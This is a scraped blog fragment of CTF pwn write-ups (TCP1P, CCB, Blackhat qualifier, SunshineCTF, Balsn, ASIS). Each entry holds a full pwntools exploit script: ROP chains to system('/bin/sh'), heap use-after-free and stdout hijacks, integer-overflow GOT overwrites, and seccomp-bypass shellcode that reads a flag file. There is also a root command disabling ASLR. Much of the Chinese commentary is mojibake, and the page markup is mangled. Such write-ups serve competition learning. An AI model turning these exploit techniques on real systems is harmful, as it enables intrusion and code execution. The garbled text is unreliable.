&lt;p&gt;as we got all the addr we need,then the last time we just use normal rop&lt;br&gt;
I&#39;ve tried ogg but it doesn&#39;t work on my local&lt;br&gt;
and one thing to mention,if you just use &lt;code&gt;libc_addr+libc.sym[b&amp;quot;system&amp;quot;]&lt;/code&gt; as the addr of &lt;code&gt;system&lt;/code&gt;, you probably can&#39;t get shell at last, I guess maybe it&#39;s because stack alighment problem, so we just add &lt;code&gt;0x1b&lt;/code&gt; as offset to call &lt;code&gt;do_system&lt;/code&gt; directly&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;0x7ffff7c50d7b &amp;lt;system+27&amp;gt;    call   do_system                &amp;lt;do_system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;disturbing when it doesn&#39;t provide any info about the libc&lt;br&gt;
however we can just leak from remote and infer&lt;/p&gt;
&lt;p&gt;and I just use the following when debugging, it&#39;s annoying to meet the 1/16 when dealing with the aslr&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./gamechanger&amp;quot;)
# io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,9254)
elf=ELF(&amp;quot;./gamechanger&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc

io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x104)+b&amp;quot;nmsl&amp;quot;+b&amp;quot;\x10\x51&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;nmsl&amp;quot;)
base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1110
pop_rbp=base_addr+0x11e3
ret=base_addr+0x1016
read_text=base_addr+0x1060
leave_ret=base_addr+0x1358
puts_plt=base_addr+elf.plt[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))


##############


io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

io.recvuntil(b&amp;quot;100\n&amp;quot;)
now = int((time.time()))
cs.srand(now)
io.sendline(str((cs.rand()+0x22)%0x17))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(base_addr+elf.sym[b&amp;quot;puts&amp;quot;])+p64(base_addr+0x135a)
io.send(payload)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x620d0
print(&amp;quot;leak_addr: &amp;quot; +hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

####### 
# io.sendlineafter(b&amp;quot;No): &amp;quot;,b&amp;quot;1&amp;quot;)

# io.recvuntil(b&amp;quot;100\n&amp;quot;)
# now = int((time.time()))
# cs.srand(now)
# io.sendline(str((cs.rand()+0x22)%0x17))


# io.recvuntil(b&amp;quot;morning?\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr+0x1b)
io.send(payload)



io.interactive()

# 0x000000000002a3e5 : pop rdi ; ret                                                                         


# 0x00000000000011e3: pop rbp; ret; 
# 0x0000000000001016: ret; 
# 0x0000000000001358: leave; ret; 


# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [r12] == NULL || r12 == NULL

# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   [rbp-0x50] == NULL || rbp-0x50 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;unsafe&#34;&gt;unsafe:&lt;/h4&gt;
&lt;p&gt;int-overflow to bypass the random check&lt;br&gt;
no check for the minus in  &lt;code&gt;deposit&lt;/code&gt; func&lt;br&gt;
so there is OOB write , the second input in this func is to do plus or minus with the value on that addr based on the offset of the variable &lt;code&gt;safes&lt;/code&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./unsafe&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,1477)
elf=ELF(&amp;quot;./unsafe&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc=elf.libc


idx=((1&amp;lt;&amp;lt;31)+0x1)-1&amp;lt;&amp;lt;32
io.sendlineafter(b&amp;quot;age: &amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;\x00\x00\x00\x00&amp;quot;)

now = int((time.time()))

cs.srand(0)

io.sendlineafter(b&amp;quot;password: \n&amp;quot;,str(cs.rand()))

# gdb.attach(io)
# pause()

### make /bin/sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x3b6873))

### exit_message to str_sh
io.sendlineafter(b&amp;quot;): \n&amp;quot;,str(0x64))
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(0x2058))

### puts to system
io.sendlineafter(b&amp;quot;): \n&amp;quot;,b&amp;quot;-12&amp;quot;)
io.sendlineafter(b&amp;quot;deposit: \n&amp;quot;,str(-0x291e0))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC:&lt;/h3&gt;
&lt;h4 id=&#34;sanity-check&#34;&gt;Sanity Check:&lt;/h4&gt;
&lt;p&gt;discord server bot&#39;s sign was the flag&lt;/p&gt;
&lt;h4 id=&#34;guess-my-number&#34;&gt;Guess my number:&lt;/h4&gt;
&lt;p&gt;baisc script writing with pwntools and ctypes&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *

# io=process(&amp;quot;./guess&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,7331)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x539)

key=0xcafebabe ^ (cs.rand() + 0x1467f3)

io.sendlineafter(&amp;quot;Guess : &amp;quot;,str(key))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">TCP1P</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/cMQySKj3Y/"" data-c="
          &lt;h3 id=&#34;ccb_veh&#34;&gt;ccb_veh&lt;/h3&gt;
&lt;p&gt;å †é£æ°´&lt;br&gt;
2.31å¼€æ²™ç›’ç¦ç”¨execve UAF,æŒ‡é’ˆä¿ç•™æœ€åä¸€æ¬¡åˆ†é…çš„å †å—æŒ‡é’ˆ&lt;br&gt;
æ‰€ä»¥æˆ‘ä»¬åˆ›å»º2ä¸ªå¤§å°ä¸åŒçš„å †å—åˆ†åˆ«å®ç°æ³„éœ²libcå’Œæ ˆåœ°å€ï¼Œretåœ°å€å†™orw ç¬¬ä¸€ä¸ªå †å—å¯ä»¥é‡å¤é‡Šæ”¾ï¼Œä¿®æ”¹ä½å­—èŠ‚æ‰“&lt;code&gt;stdout&lt;/code&gt;ï¼ŒåŠä¸ªå­—èŠ‚1/16æ¦‚ç‡&lt;code&gt;stdout&lt;/code&gt;æ³„éœ²libcå’Œæ ˆåœ°å€&lt;br&gt;
ç„¶åç¬¬äºŒä¸ªå †å—è´Ÿè´£åŠ«æŒretåœ°å€ï¼Œè¿™é‡ŒåŠ«æŒçš„æ˜¯é€€å‡ºä¸»å‡½æ•°çš„ret å°†retåœ°å€å†™orwå³å¯ ï¼ˆæœ€å¼€å§‹æ‰“hookçš„æ—¶å€™å¤šåˆ›å»ºäº†ä¸€ä¸ªå †å—ï¼Œåˆ æ‰ä¹Ÿå¯ä»¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./veh&amp;quot;)
io=remote(&amp;quot;47.104.16.93&amp;quot;,4551)
elf=ELF(&amp;quot;./veh&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;contents:\n&amp;quot;,cc)
    
def delete():
    io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)


# gdb.attach(io)
# pause()    

stdout=libc.sym[b&amp;quot;_IO_2_1_stdout_&amp;quot;]
print(&amp;quot;stdout: &amp;quot;,hex(stdout))

add(0x100)
delete()

add(0x90)
add(0x90)
add(0x90)
delete()
edit(b&amp;quot;gap&amp;quot;)

for i in range(3):
    add(0x150)  
    
delete()


add(0x100)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()

edit(b&amp;quot;\xa0\x26&amp;quot;)

add(0x100)
add(0x100)
edit(p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1ec980
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]

edit(p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8))
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x100

pop_rdi=leak_addr+0x23b6a
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92


#open
orw=b&amp;quot;./flag\x00\x00&amp;quot;+p64(pop_rdi)+p64(ret_addr-8)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rdx)+p64(0x50)+p64(write_a)


add(0x150)
delete()
for i in range(7):
    edit(p64(0)*2)
    delete()
    
    
# gdb.attach(io)
# pause()    


edit(p64(ret_addr-8))
add(0x150)
add(0x150)
edit(orw)

io.sendlineafter(b&amp;quot;choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
# add(0x90)
# delete()
# for i in range(3):
#     edit(p64(0)*2)
#     delete()
    
# edit(p64(malloc_hook))
# add(0x90)
# add(0x90)
# edit(p64(ret_addr+8))
# gdb.attach(io)
# pause()    



# payload=p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+8)
# payload=payload.ljust(147,b&amp;quot;\x00&amp;quot;)+p64(free_hook)
# edit(payload)

# add(0x100)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ccb_chal&#34;&gt;ccb_chal&lt;/h3&gt;
&lt;p&gt;è¿™é“é¢˜èµ›åœºç¯å¢ƒæˆ‘åªèƒ½hhäº†&lt;br&gt;
æœ¬è´¨ä¸Šåˆ©ç”¨uafæ”¹å€¼è¿›å…¥&lt;code&gt;game2()&lt;/code&gt;ï¼Œç„¶åæ‰“shellcode&lt;br&gt;
å¼€äº†æ²™ç›’,ç”¨&lt;code&gt;openat,pread,writev&lt;/code&gt;ç»•å°±å®Œäº†&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chal&amp;quot;)
# io=remote(&amp;quot;47.94.205.47&amp;quot;,29706)

def add(n,s):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;much:\n&amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;one:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;is at &amp;quot;)
age_addr=int(io.recvuntil(b&amp;quot;,&amp;quot;,drop=True),16)
print(&amp;quot;age_addr : &amp;quot;,hex(age_addr))

add(1,0x70)
add(0,0x70)
delete(1)
# edit(1,p64(0)*2)
delete(0)
# edit(0,p64(0)*2)

edit(0,p64(age_addr))

add(2,0x70)
add(3,0x70)
edit(3,str(0x100))

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;relax\n&amp;quot;,b&amp;quot;4&amp;quot;)

io.recvuntil(b&amp;quot;me?\n&amp;quot;)


payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi, 0xffffff9c; mov rsi,rsp; xor rdx,rdx; mov rax,257;syscall;&#39;) #openat flag
# payload = asm(&#39;mov rax, 0x67616c66; push rax; mov rdi,rsp; xor rsi,rsi; xor rdx,rdx; mov rax,2;syscall;&#39;) #open flag
payload += asm(shellcraft.pread(3,0x10500,0x100,0))
payload += asm(shellcraft.writev(1,0x10100,1))
payload = payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+flat(0x10500,0x100)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;blackhat_qual_profile&#34;&gt;blackhat_qual_profile:&lt;/h3&gt;
&lt;p&gt;æ•´æ•°æº¢å‡ºå¯¼è‡´çš„ä»»æ„åœ°å€å†™ï¼Œ&lt;code&gt;partial relro&lt;/code&gt;å¯å†™gotè¡¨&lt;br&gt;
æ‰‹åŠ¨æ„é€ ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²åœ°å€æœ€åæ‰“one_gadget&lt;br&gt;
æ³¨æ„æ„é€ é¡ºåºå’Œå‘é€ç»†èŠ‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./profile&amp;quot;)
# io=remote(&amp;quot;54.78.163.105&amp;quot;,31321)
elf=ELF(&amp;quot;./profile&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

# exit_g=0x404068
# free_g=0x404018
exit_g=elf.plt[b&amp;quot;exit&amp;quot;]


### free to main
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x8c\x13\x40&amp;quot;)
# io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(0x40138c)[:-1])


### exit to _start
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040406800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\xb0\x11\x40&amp;quot;)

### free to print
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;\x20\x11\x40&amp;quot;)


### leak
io.recvuntil(b&amp;quot;Age: &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Name: &amp;quot;,b&amp;quot;%11$p&amp;quot;)
io.recvuntil(b&amp;quot;0x&amp;quot;)
leak_addr=int(io.recv(12),16)-0x29d90
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0x50a37

### free to one_gadget
io.recvuntil(b&amp;quot;Age: &amp;quot;)
idx=(1&amp;lt;&amp;lt;63)-(1&amp;lt;&amp;lt;64)+0x8040401800aaaaaa
payload=str(idx)
io.sendline(payload)

io.sendlineafter(b&amp;quot;Name: &amp;quot;,p64(sys_addr))


io.interactive()

# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sunshine_flock&#34;&gt;sunshine_flock:&lt;/h3&gt;
&lt;p&gt;å¥—å¨ƒå‡½æ•°ï¼Œæ¯æ¬¡é€€å›ä¸Šä¸€å±‚å‡½æ•°æ—¶åˆ¤æ–­retåœ°å€å€¼æ˜¯å¦å¯¹åº”ï¼Œå¾—æ³¨æ„ä¸€ä¸‹å¸ƒæ ˆ&lt;br&gt;
é€€åˆ°æŸä¸€å±‚å‘ç°äº†æ ˆä¸Šå·²ç»å†™å¥½äº†æ¥ä¸‹æ¥çš„é¡ºåº&lt;br&gt;
æœ€åæ ¹æ®åç§»å°†å¯¹åº”è¿”å›åœ°å€å¤„æ”¹ä¸ºåé—¨å‡½æ•°åœ°å€getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./flock&amp;quot;)
io=remote(&amp;quot;chal.2023.sunshinectf.games&amp;quot;,23002)
elf=ELF(&amp;quot;./flock&amp;quot;)

# gdb.attach(io.pid)
# pause()

win=0x4011bd

io.recvuntil(b&amp;quot;At &amp;quot;)
stack_addr=int(io.recv(14),16)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.recvuntil(b&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;)
payload=p64(0x4012a0)+p64(stack_addr+0x98)
payload=payload.ljust(0x80,b&amp;quot;a&amp;quot;)
payload+=p64(stack_addr+0xa0)+p64(0x401276)+p64(0x4012a0)*2
payload+=p64(stack_addr+0xc0)+p64(0x4012a0)
payload+=p64(0x402048)+p64(0x4012ca)
payload+=p64(stack_addr+0xe0)+p64(0x4012ca)
payload+=p64(0)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x10)+p64(0x4012f0)
payload+=p64(stack_addr+0xe0+0x20)+p64(win)


# payload+=p64(0x4012a0)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;balsn_babypwn2023&#34;&gt;balsn_babypwn2023:&lt;/h3&gt;
&lt;p&gt;æ­¤é¢˜3ç§è§£æ³•&lt;br&gt;
æ ‡å‡†è§£æ³•æ˜¯æ ˆè¿ç§»&lt;br&gt;
ä¸¤ç§éé¢„æœŸä¸€ç§æ˜¯&lt;code&gt;XNUCA2018_gets&lt;/code&gt;çˆ†one_gadget&lt;br&gt;
å¦å¤–ä¸€ç§æ˜¯åˆ©ç”¨å†æ¬¡è¯»å…¥æ—¶è¯»çš„æ—¶lock_fileçš„IOç»“æ„ä½“ä¸Šå­˜åœ¨åœ°å€ï¼Œå¯ä»¥æ³„éœ²&lt;br&gt;
ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ³„éœ²å‡ºçš„åœ°å€ä¼šæ ¹æ®å†…æ ¸ç‰ˆæœ¬æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºæ³„éœ²çš„åœ°å€ä¸åœ¨libcä¸Š&lt;br&gt;
æˆ‘çš„WSL2çš„ubuntuæ°å¥½è·Ÿdockeré‡Œé¢æä¾›çš„ä¸€æ ·ï¼Œæœ€åçš„åç§»ä¹Ÿä¸€æ ·&lt;br&gt;
åŒæ ·glibc patchä¹‹åçš„ubuntuè™šæ‹Ÿæœºåç§»å°±æœ‰æ‰€ä¸åŒäº†ï¼Œè¿™ç§è§£æ³•è¿æ°”æˆä»½åå¤š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./chall&amp;quot;)
# io=remote(&amp;quot;babypwn2023.balsnctf.com&amp;quot;,10105)
elf=ELF(&amp;quot;./chall&amp;quot;)
libc=elf.libc
# libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

gdb.attach(io)
pause()

payload=cyclic(0x28)+p64(elf.plt[b&amp;quot;gets&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(elf.sym[b&amp;quot;main&amp;quot;])
io.sendline(payload)

payload=p64(0)*2+p32(0xdeadbeef)+b&amp;quot;\x00\x00\x00&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3b8740
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+next(libc.search(asm(&amp;quot;pop rdi; ret&amp;quot;)))
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_hipwn&#34;&gt;asis_2023_hipwn:&lt;/h3&gt;
&lt;p&gt;ä¿æŠ¤å…¨å¼€ï¼Œæ­¤é¢˜æœ€å¼€å§‹å°è¯•åˆ©ç”¨ssp leak,åŠ«æŒ &lt;code&gt;__libc_argv[0]&lt;/code&gt; æ‰“å°å‡ºflag,ä½†æ˜¯glibcç‰ˆæœ¬å¤ªé«˜å·²ç»ä¿®å¤äº†è¿™ä¸ªåˆ©ç”¨&lt;br&gt;
è¿›è€Œè€ƒè™‘æ­£å¸¸leakï¼Œåˆ©ç”¨putsä»»æ„åœ°å€æ³„éœ²ï¼Œleakå‡ºcanaryå’Œlibcå³å¯æ­£å¸¸rop&lt;br&gt;
(ä¸çŸ¥é“ç»™çš„ä»»æ„åœ°å€å†™ &lt;code&gt;\x00&lt;/code&gt; æœ‰å•¥ç”¨&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall_p&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)
io=remote(&amp;quot;45.153.243.57&amp;quot;,1337)
# elf=ELF(&amp;quot;./chall&amp;quot;)

# gdb.attach(io)
# pause()

# def zr(i):
#   io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x48+i))
#    io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;)
#    io.recvuntil(b&amp;quot;?\n&amp;quot;)
#    io.sendline(str(0x539))
# for i in range(8):
#    zr(i)
# gdb.attach(io)
# pause()

#1
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x300))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0x48+b&amp;quot;.&amp;quot;)
io.recvuntil(b&amp;quot;.&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))
# gdb.attach(io)
# pause()

#2
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,b&amp;quot;a&amp;quot;*0xf8)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-128-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]

print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
ret=leak_addr+0xf8098
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(str(0x539))

#3
io.sendlineafter(b&amp;quot;much???\n&amp;quot;,str(0x400))
io.sendafter(b&amp;quot;content\n&amp;quot;,cyclic(0x48)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr))
io.recvuntil(b&amp;quot;?\n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;asis_2023_text_editor&#34;&gt;asis_2023_text_editor:&lt;/h3&gt;
&lt;p&gt;ä¸»å‡½æ•°ç»™äº†3ä¸ªå‡½æ•°ï¼Œ &lt;code&gt;edit_text,save_text,show_error&lt;/code&gt;&lt;br&gt;
&lt;code&gt;edit_text&lt;/code&gt; å°†ç”¨æˆ·è¾“å…¥å­˜å…¥textåœ°å€å¤„&lt;br&gt;
